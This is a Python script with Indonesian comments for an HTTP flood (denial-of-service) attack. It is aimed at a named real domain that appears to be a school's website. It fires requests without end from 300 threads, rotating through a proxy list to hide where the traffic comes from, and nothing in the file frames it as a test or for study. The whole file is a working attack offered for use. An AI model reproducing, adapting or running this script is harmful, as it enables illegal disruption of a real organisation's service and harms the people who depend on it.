#!/usr/bin/env python3
import requests, random, time
from concurrent.futures import ThreadPoolExecutor

# === Konfigurasi Target ===
TARGET = "https://smpn2serangkota.sch.id"   # ganti target
PORT = 80                       # port target (hanya untuk referensi)
THREADS = 300                   # jumlah threads
TIMEOUT = 500

# === Load Proxy List ===
def load_proxies(file_path="proxy.txt"):
    proxies = []
    with open(file_path, "r") as f:
        for line in f:
            proxy = line.strip()
            if proxy:
                proxies.append(proxy)
    return proxies

# === Fungsi Request ===
def send_request(proxies):
    proxy = random.choice(proxies)
    if "@" in proxy:  
        # Format user:pass@ip:port
        auth, address = proxy.split("@")
        user, pwd = auth.split(":")
        ip, port = address.split(":")
        proxy_fmt = f"http://{user}:{pwd}@{ip}:{port}"
    else:
        # Format ip:port
        proxy_fmt = f"http://{proxy}"

    try:
        r = requests.get(
            TARGET,
            proxies={"http": proxy_fmt, "https": proxy_fmt},
            timeout=TIMEOUT
        )
        print(f"[✓] {proxy} => {r.status_code}")
    except Exception as e:
        print(f"[x] {proxy} gagal: {e}")

# === Main ===
def main():
    proxies = load_proxies()
    if not proxies:
        print("Proxy list kosong!")
        return
    
    print(f"Target: {TARGET}:{PORT}")
    print(f"Threads: {THREADS}")
    print(f"Jumlah Proxy: {len(proxies)}")
    print("="*40)

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        while True:
            executor.submit(send_request, proxies)
            time.sleep(0.01)  # supaya tidak overload CPU

if __name__ == "__main__":
    main()
